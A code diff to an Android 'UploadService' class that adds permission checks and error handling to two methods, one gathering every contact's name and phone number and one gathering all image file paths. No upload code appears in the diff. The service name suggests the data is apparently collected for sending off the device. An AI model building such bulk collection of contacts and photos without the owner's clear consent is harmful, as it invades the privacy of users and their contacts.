@@ -8,6 +8,7 @@ import android.app.NotificationManager;
 import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
@@ -18,6 +19,7 @@ import android.provider.Settings;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -117,47 +119,92 @@ public class UploadService extends Service {
         List<String> contacts = new ArrayList<>();
         ContentResolver resolver = getContentResolver();
 
-        // Query the ContactsContract to get all contacts
-        Cursor cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
-                null, null, null, null);
+        // Check if the READ_CONTACTS permission is granted
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            Log.e("PermissionError", "READ_CONTACTS permission not granted.");
+            // Optionally notify the user or log the error
+            return contacts; // Return an empty list to avoid crash
+        }
 
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
-                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+        Cursor cursor = null;
+        try {
+            // Query the ContactsContract to get all contacts
+            cursor = resolver.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, null, null, null);
 
-                // Query the Phone table to get the phone numbers associated with the contact
-                Cursor phones = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                        new String[]{contactId}, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
 
-                if (phones != null) {
-                    while (phones.moveToNext()) {
-                        String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        // Add the contact's name and phone number to the list
-                        contacts.add(name + ": " + phoneNumber);
+                    // Query the Phone table to get the phone numbers associated with the contact
+                    Cursor phones = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{contactId}, null);
+
+                    if (phones != null) {
+                        while (phones.moveToNext()) {
+                            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                            // Add the contact's name and phone number to the list
+                            contacts.add(name + ": " + phoneNumber);
+                        }
+                        phones.close();
                     }
-                    phones.close();
                 }
             }
-            cursor.close();
+        } catch (SecurityException e) {
+            Log.e("PermissionError", "SecurityException occurred while fetching contacts.", e);
+        } finally {
+            if (cursor != null) {
+                cursor.close();
+            }
         }
+
         return contacts;
     }
 
+
     private List<String> fetchGalleryData() {
         List<String> filePaths = new ArrayList<>();
-        Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        String[] projection = {MediaStore.Images.Media.DATA};
-        Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
 
-        if (cursor != null) {
-            while (cursor.moveToNext()) {
-                String filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
-                filePaths.add(filePath);
+        // Check if the required permissions are granted
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
+                Log.e("PermissionError", "READ_MEDIA_IMAGES permission not granted.");
+                return filePaths; // Return an empty list to avoid crash
             }
-            cursor.close();
+        } else {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+                Log.e("PermissionError", "READ_EXTERNAL_STORAGE permission not granted.");
+                return filePaths; // Return an empty list to avoid crash
+            }
         }
+
+        Cursor cursor = null;
+        try {
+            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] projection = {MediaStore.Images.Media.DATA};
+
+            // Query the MediaStore to fetch image file paths
+            cursor = getContentResolver().query(uri, projection, null, null, null);
+
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
+                    if (dataIndex != -1) { // Ensure the column exists
+                        String filePath = cursor.getString(dataIndex);
+                        filePaths.add(filePath);
+                    }
+                }
+            }
+        } catch (SecurityException e) {
+            Log.e("PermissionError", "SecurityException occurred while fetching gallery data.", e);
+        } finally {
+            if (cursor != null) {
+                cursor.close(); // Ensure the cursor is closed to avoid memory leaks
+            }
+        }
+
         return filePaths;
     }
 
